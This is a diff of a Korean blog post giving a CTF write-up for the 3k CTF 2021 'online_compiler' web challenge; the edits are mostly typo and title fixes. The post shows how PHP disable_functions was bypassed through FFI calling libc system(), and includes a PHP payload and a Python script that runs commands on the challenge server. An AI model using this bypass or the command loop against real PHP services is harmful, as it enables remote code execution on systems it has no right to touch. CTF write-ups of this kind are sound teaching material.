@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="(Web) online_compiler [425 pts] online_compiler 문제는 FFI를 이용해서 외부 함수를 호출해 RCE를 트리거 한 후에 플래그를 획득하는 문제이다.   일단 문제에서 back-end 코드와 php.ini 파일이 주어지는데 백엔드 코드에서는 그냥 php 코드를 실행할 때 php.ini 파일을 기반으로 실행시키는 것만 확인하">
+    <meta name="description" content="(Web) online_compiler [425 pts] online_compiler 문제는 disable_functions를 우회하고 플래그를 획득하는 문제입니다.  일단 문제에서 back-end 코드와 php.ini 파일이 주어지는데 백엔드 코드에서는 그냥 php 코드를 실행할 때 php.ini 파일을 기반으로 실행시키는 것만 확인하면 된다. php.i">
 <meta property="og:type" content="article">
-<meta property="og:title" content="3kCTF 2021 Write Up">
+<meta property="og:title" content="3k CTF 2021 Write Up">
 <meta property="og:url" content="http://example.com/2021/05/17/2021-05-17-3kCTF-2021/index.html">
 <meta property="og:site_name" content="Home">
-<meta property="og:description" content="(Web) online_compiler [425 pts] online_compiler 문제는 FFI를 이용해서 외부 함수를 호출해 RCE를 트리거 한 후에 플래그를 획득하는 문제이다.   일단 문제에서 back-end 코드와 php.ini 파일이 주어지는데 백엔드 코드에서는 그냥 php 코드를 실행할 때 php.ini 파일을 기반으로 실행시키는 것만 확인하">
+<meta property="og:description" content="(Web) online_compiler [425 pts] online_compiler 문제는 disable_functions를 우회하고 플래그를 획득하는 문제입니다.  일단 문제에서 back-end 코드와 php.ini 파일이 주어지는데 백엔드 코드에서는 그냥 php 코드를 실행할 때 php.ini 파일을 기반으로 실행시키는 것만 확인하면 된다. php.i">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/1.png?raw=true">
 <meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-16%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.00.45.png?raw=true">
@@ -21,7 +21,7 @@
 <meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.39.19.png?raw=true">
 <meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.50.22.png?raw=true">
 <meta property="article:published_time" content="2021-05-17T00:00:13.000Z">
-<meta property="article:modified_time" content="2021-05-16T17:57:54.957Z">
+<meta property="article:modified_time" content="2021-05-16T23:16:53.235Z">
 <meta property="article:author" content="Jeongwon Jo">
 <meta property="article:tag" content="RCE">
 <meta property="article:tag" content="PHP">
@@ -46,7 +46,7 @@
       
     
     <!-- title -->
-    <title>3kCTF 2021 Write Up</title>
+    <title>3k CTF 2021 Write Up</title>
     <!-- styles -->
     
 <link rel="stylesheet" href="/css/style.css">
@@ -101,16 +101,16 @@
     <div id="share" style="display: none">
       <ul>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&text=3kCTF 2021 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3kCTF 2021 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&is_video=false&description=3kCTF 2021 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=3kCTF 2021 Write Up&body=Check out this article: http://example.com/2021/05/17/2021-05-17-3kCTF-2021/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3kCTF 2021 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3kCTF 2021 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3kCTF 2021 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3kCTF 2021 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&name=3kCTF 2021 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&t=3kCTF 2021 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&text=3k CTF 2021 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3k CTF 2021 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&is_video=false&description=3k CTF 2021 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=3k CTF 2021 Write Up&body=Check out this article: http://example.com/2021/05/17/2021-05-17-3kCTF-2021/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3k CTF 2021 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3k CTF 2021 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3k CTF 2021 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3k CTF 2021 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&name=3k CTF 2021 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&t=3k CTF 2021 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -127,7 +127,7 @@
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
-        3kCTF 2021 Write Up
+        3k CTF 2021 Write Up
     </h1>
 
 
@@ -165,13 +165,13 @@
 
   <div class="content" itemprop="articleBody">
     <h2 id="Web-online-compiler-425-pts"><a href="#Web-online-compiler-425-pts" class="headerlink" title="(Web) online_compiler [425 pts]"></a>(Web) online_compiler [425 pts]</h2><blockquote>
-<p>online_compiler 문제는 FFI를 이용해서 외부 함수를 호출해 RCE를 트리거 한 후에 플래그를 획득하는 문제이다. </p>
+<p>online_compiler 문제는 disable_functions를 우회하고 플래그를 획득하는 문제입니다.</p>
 </blockquote>
-<p>일단 문제에서 <code>back-end</code> 코드와 <code>php.ini</code> 파일이 주어지는데 백엔드 코드에서는 그냥 php 코드를 실행할 때 <code>php.ini</code> 파일을 기반으로 실행시키는 것만 확인하면 된다. <code>php.ini</code> 파일을 확인해보면 <code>diable_functions</code>에 의해 많은 함수들이 비활성화 되어 있다. 당연히 <code>system()</code>, <code>exec()</code>와 같이 쉘 명령어를 실행 할 수 있는 함수들도 비 활성화 되어 있다..</p>
+<p>일단 문제에서 <code>back-end</code> 코드와 <code>php.ini</code> 파일이 주어지는데 백엔드 코드에서는 그냥 php 코드를 실행할 때 <code>php.ini</code> 파일을 기반으로 실행시키는 것만 확인하면 된다. <code>php.ini</code> 파일을 확인해보면 <code>disable_functions</code>에 의해 많은 함수들이 비활성화 되어 있다. 당연히 <code>system()</code>, <code>exec()</code>와 같이 쉘 명령어를 실행 할 수 있는 함수들도 비활성화 되어 있다..</p>
 <p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/1.png?raw=true"></p>
-<p>하지만 <code>phpinfo()</code>는 비 활성화가 되어 있지 않아 위와 같이 <code>PHP Version</code>을 확인할 수 있었고, 7.4.X 버전을 사용 중 이라는 것을 알 수 있었다. 그래서 해당 버전에서 발생하는 취약점들을 찾아보았다.</p>
+<p>하지만 <code>phpinfo()</code>는 비활성화가 되어 있지 않아 위와 같이 <code>PHP Version</code>을 확인할 수 있었고, 7.4.X 버전을 사용 중 이라는 것을 알 수 있었다. 그래서 해당 버전에서 발생하는 취약점들을 찾아보았다.</p>
 <p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-16%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.00.45.png?raw=true"><br><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.43.32.png?raw=true"></p>
-<p>그러다가 구글링을 하다가 위 내용을 발견했다. 키워드는 <code>php 7.4 disable_functions bypass</code>로 검색했는데 위 내용은 <code>bypass</code> 항목들 중 하나였다. <code>phpinfo()</code>에서 확인을 해보니 활성화가 되어 있는 것을 볼 수 있다.</p>
+<p>구글링을 하다가 위 내용을 발견했다. 키워드는 <code>php 7.4 disable_functions bypass</code>로 검색했는데 위 내용은 <code>bypass</code> 항목들 중 하나였다. <code>phpinfo()</code>에서 확인을 해보니 활성화가 되어 있는 것을 볼 수 있다.</p>
 <p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.31.49.png?raw=true"></p>
 <p>그래서 5월 16일 오후 7시쯤 진규형님께 보내서 <code>일단 이게 젤 가능해보이는데</code>라고 아무 생각 없이 시전을 했다 ㅋㅋ. 씨발 그래도 그 후에 삽질을 2시간 더 했다.</p>
 <p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.30.48.png?raw=true"></p>
@@ -179,7 +179,7 @@
 <p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.39.19.png?raw=true"></p>
 <p>C Language system() 함수의 원형을 알아보니 위와 같았다. 그냥 <code>const char command</code>할 때는 안 됐는더 포인터 변수로 안 해줘서 그런 거 같다.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$ffi</span>=FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line">  <span class="variable">$ffi</span>-&gt;system(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>그래서 결과적으로 위와 같이 페이로드가 작성됐다. 처음에는 위 사진처럼 라이브러시 파일도 같이 인자로 넘겨주었지만 넘겨주면 잘 되지 않았다. 아마 같은 경로에 파일이 없어서 그런 거 같은데 없이 해줘도 아무 문제 없었다.</p>
+<p>그래서 결과적으로 위와 같이 페이로드가 작성됐다. 처음에는 위 사진처럼 라이브러리 파일도 같이 인자로 넘겨주었지만 넘겨주면 잘 되지 않았다. 아마 같은 경로에 파일이 없어서 그런 거 같은데 없이 해줘도 아무 문제 없었다.</p>
 <p><img src="https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.50.22.png?raw=true"></p>
 <p>파이썬으로 익스 코드를 작성하고, 확인을 해보니 상위 티렉터리에 <code>El_FlAAG___FilEE</code> 파일이 존재했다. 그래서 해당 파일을 읽으니 플래그가 나왔다. 결국 아까 오후 7시쯤에 진규 형님께 시전한 게 맞았다. zz</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://onlinecompiler.2021.3k.ctf.to:5000/&#x27;</span></span><br><span class="line">path = [<span class="string">&#x27;save&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    command = raw_input(<span class="string">&quot;pocas@py : &quot;</span>)</span><br><span class="line">    c_type, code = <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;&lt;?php $ffi=FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(\&#x27;&#123;&#125;\&#x27;);?&gt;&#x27;</span>.<span class="built_in">format</span>(command)</span><br><span class="line">    body1 = &#123;<span class="string">&#x27;c_type&#x27;</span>:c_type, <span class="string">&#x27;code&#x27;</span>:code&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># save</span></span><br><span class="line">    filename = requests.post(url + path[<span class="number">0</span>], data=body1).text</span><br><span class="line">    log.info(<span class="string">&quot;Exploitation&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;filename : &quot;</span> + filename)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compile</span></span><br><span class="line">    body2 = &#123;<span class="string">&#x27;c_type&#x27;</span>:c_type, <span class="string">&#x27;filename&#x27;</span>:filename&#125;</span><br><span class="line">    result = requests.post(url + path[<span class="number">1</span>], data=body2).text.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;result : &quot;</span> + result)</span><br></pre></td></tr></table></figure>
@@ -224,16 +224,16 @@
     <div id="share-footer" style="display: none">
       <ul>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&text=3kCTF 2021 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3kCTF 2021 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&is_video=false&description=3kCTF 2021 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=3kCTF 2021 Write Up&body=Check out this article: http://example.com/2021/05/17/2021-05-17-3kCTF-2021/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3kCTF 2021 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3kCTF 2021 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3kCTF 2021 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3kCTF 2021 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&name=3kCTF 2021 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&t=3kCTF 2021 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&text=3k CTF 2021 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3k CTF 2021 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&is_video=false&description=3k CTF 2021 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=3k CTF 2021 Write Up&body=Check out this article: http://example.com/2021/05/17/2021-05-17-3kCTF-2021/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3k CTF 2021 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3k CTF 2021 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3k CTF 2021 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&title=3k CTF 2021 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&name=3k CTF 2021 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/17/2021-05-17-3kCTF-2021/&t=3k CTF 2021 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
